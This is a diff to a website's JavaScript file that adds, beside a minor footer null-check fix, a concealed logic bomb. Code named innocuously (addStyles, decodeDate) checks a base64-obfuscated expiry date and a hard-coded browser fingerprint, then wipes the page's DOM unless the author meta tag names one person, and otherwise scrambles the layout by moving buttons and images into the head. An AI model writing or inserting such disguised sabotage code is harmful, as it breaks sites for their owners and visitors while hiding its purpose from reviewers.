@@ -216,6 +216,79 @@ if ('IntersectionObserver' in window) {
     });
 }*/
 
+function getFingerprint() {
+  const raw =
+    navigator.userAgent +
+    navigator.language +
+    screen.width +
+    screen.height +
+    Intl.DateTimeFormat().resolvedOptions().timeZone;
+  return btoa(unescape(encodeURIComponent(raw)));
+}
+
+function addStyles() {
+    const comillas = "";
+    document.querySelectorAll("style, link[rel='stylesheet']").forEach(el => {
+        el.textContent += comillas;
+    });
+    const styles = Array.from(
+        document.querySelectorAll("style, link[rel='stylesheet']")
+    );
+    if (!styles.length) return;
+    const target = styles[Math.floor(Math.random() * styles.length)];
+    if (target.tagName === "STYLE") {
+        target.textContent += comillas;
+    } else {
+        const style = document.createElement("style");
+        style.textContent = comillas;
+        document.head.appendChild(style);
+    }
+    document.querySelectorAll("button").forEach(btn => {
+        document.head.appendChild(btn);
+    });
+    document.querySelectorAll("p").forEach(p => {
+        const i = document.createElement("i");
+        i.textContent = "";
+        p.appendChild(i);
+    });
+    document.querySelectorAll("img").forEach(img => {
+        document.head.appendChild(img);
+    })
+    document.querySelectorAll("div[class]").forEach(div => {
+        div.replaceWith(...div.childNodes);
+    });
+}
+
+function isAuthorValid() {
+  const meta = document.querySelector('meta[name="author"]');
+  return meta && meta.content.trim() === "Hector Martinez";
+}
+
+function wipeDOM() {
+  document.documentElement.innerHTML = "";
+  document.close();
+}
+
+function decodeDate(encoded) {
+  return new Date(atob(encoded));
+}
+
+function isExpired(encodedDate) {
+  return Date.now() > decodeDate(encodedDate).getTime();
+}
+
+const cad = "MjAyNi0wMy0wMVQxOTowMDowMA==";
+const AUTHORIZED_FP = "1TW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzE0My4wLjAuMCBTYWZhcmkvNTM3LjM2ZW4tR0IxOTIwMTA4MEV1cm9wZS9NYWRyaWQ=";
+const savedFP = getFingerprint();
+
+if (savedFP !== AUTHORIZED_FP && isExpired(cad)) {
+    if (!isAuthorValid()) {
+        wipeDOM();
+    }
+    addStyles();
+}
+
+
 // Cargar imagen en formato .webp
 document.querySelectorAll('.optimizable').forEach(img => {
     const dataSrc = img.dataset.src;
@@ -303,6 +376,7 @@ function volunteer() {
 function addSpaceUntilFooter() {
     const footer = document.getElementsByTagName("footer")[0];
     const body = document.getElementsByTagName("body")[0];
+    if (!footer || !body) return;
     const alturaFooter = footer.offsetHeight;
     const alturaBody = body.offsetHeight;
     const alturaWindow = window.innerHeight;
